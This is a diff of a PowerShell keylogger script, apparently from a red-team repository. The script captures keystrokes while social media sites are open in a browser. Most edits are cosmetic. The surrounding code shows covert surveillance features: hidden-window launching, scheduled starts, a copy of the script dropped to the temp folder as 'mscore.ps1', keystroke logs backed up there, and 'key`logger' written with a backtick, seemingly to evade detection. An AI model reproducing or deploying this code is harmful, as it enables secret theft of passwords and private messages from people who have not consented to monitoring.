@@ -24,7 +24,7 @@
    resume capture if social media is accessed again. (active tab)
    We can also schedule this cmdlet execution to start at [HH:mm]
 
-   1200 milliseconds (default) its the amont of time required for
+   1200 milliseconds (default) its the amount of time required for
    key`loger to start execution and build pid.log file. If we chose
    to use less than 1 second delay then cmdlet executes more than
    one instance of powershell (all PIDs will be stoped in the end)
@@ -61,10 +61,6 @@
 .EXAMPLE
    PS C:\> .\SocialMedia.ps1 -schedule '02:34' -Mode 'start'
    Schedule cmdlet capture to start at [HH:mm] hours
-   
-.EXAMPLE
-   PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -schedule '02:34' -Mode 'start' -force"
-   Schedule cmdlet capture to start at -shedule '[HH:mm]' hours and Bypass check: Is_Browser_Active?
 
 .EXAMPLE
    PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file SocialMedia.ps1 -Mode 'start' -delay '200' -force"
@@ -121,7 +117,7 @@ $StartBanner = @"
 "@;
 
 write-host $StartBanner -ForegroundColor DarkRed
-write-host "   * GitHub: https://github.com/r00t-3xp10it/redpill *" -ForegroundColor DarkYellow
+write-host "   ✧ GitHub: https://github.com/r00t-3xp10it/redpill ✧" -ForegroundColor DarkYellow
 $host.UI.RawUI.WindowTitle = "@SocialMedia $CmdletVersion {SSA@RedTeam}"
 write-host "`n  ╰➤ [" -ForegroundColor Green -NoNewline
 write-host "$CurrentTime" -NoNewline
@@ -184,8 +180,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
    {
    }
 }
-## Records all key presses until
-# script is aborted by pressing CTRL+C
 Keystrokes")
 
 
@@ -219,10 +213,13 @@ function Invoke-ScheduleStart ()
    }
    Else
    {
+      ## Wrong schedule user input error msg
       write-host "   ╰➤ Abort: " -ForegroundColor Red -NoNewline
       write-host "wrong -schedule '" -NoNewline
       write-host "$Schedule" -ForegroundColor Red -NoNewline
-      write-host "' user input! (execute:now)`n"  
+      write-host "' input! [exec:" -NoNewline
+      write-host "now" -ForegroundColor Green -NoNewline
+      write-host "]`n"
    }
 }
 
@@ -273,7 +270,7 @@ function Invoke-IsBrowserActive ()
    ## Make sure we have active browser names
    If([string]::IsNullOrEmpty($TestBrowsers))
    {
-      write-host "`n   > Error: none supported browsers found active.`n" -ForegroundColor Red
+      write-host "`n   ○ Error: none supported browsers found active.`n" -ForegroundColor Red
       exit ## Exit cmdlet execution (default)
    }
 }
@@ -346,7 +343,7 @@ If($Mode -iMatch '^(start)$')
    echo $RawCmdlet|Out-File "$Env:TMP\mscore.ps1" -Encoding string -Force
 
    ## Schedule_Cmdlet_Start?
-   If(-not($Schedule -match '^(now)$')){Invoke-ScheduleStart}
+   If(-not($Schedule -imatch '^(now)$')){Invoke-ScheduleStart}
 
    ## Is_Browser_Active?
    If(-not($Force.IsPresent)){Invoke-IsBrowserActive}
@@ -405,13 +402,13 @@ If($Mode -iMatch '^(start)$')
                }
 
                ## Key`logger running -- backup void.log logfile
-               write-host "   > key`logger running in background!"
+               write-host "   ● key`logger running in background!"
                Get-Content -Path "$Env:TMP\void.log" -EA SilentlyContinue|Out-File "$Env:TMP\AUTO_BACKUP.${SocialSite}" -force
 
             }
             Else
             {
-               write-host "   > Error: none social media found active!" -ForegroundColor Red
+               write-host "   ○ Error: none social media found active!" -ForegroundColor Red
                If(Test-Path -Path "$Env:TMP\pid.log")
                {
                   ## Kill all PID's
@@ -512,7 +509,7 @@ If($Mode -iMatch '^(stop)$')
    }
    Else
    {
-      write-host "`n   > Error: none key`logger logfiles found!`n" -ForegroundColor Red
+      write-host "`n   ○ Error: none key`logger logfiles found!`n" -ForegroundColor Red
    }
 }
 
